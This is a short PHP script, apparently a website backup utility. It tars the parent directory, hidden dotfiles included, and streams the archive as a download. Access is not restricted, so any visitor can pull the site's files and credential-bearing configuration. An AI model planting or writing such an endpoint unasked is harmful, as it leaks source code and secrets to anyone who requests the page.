<?php

set_time_limit(1000);

date_default_timezone_set('Europe/Kiev');

$cmd = "tar zcf - ../.??* ../*";

header('Content-Disposition: attachment; filename="'.$_SERVER['SERVER_NAME']."_".date('YmdHis').'.tar.gz"');
header('Content-Transfer-Encoding: binary');
header('Content-Type: application/octet-stream');
header('Content-Description: PHP Generated Data');
passthru($cmd);

?>
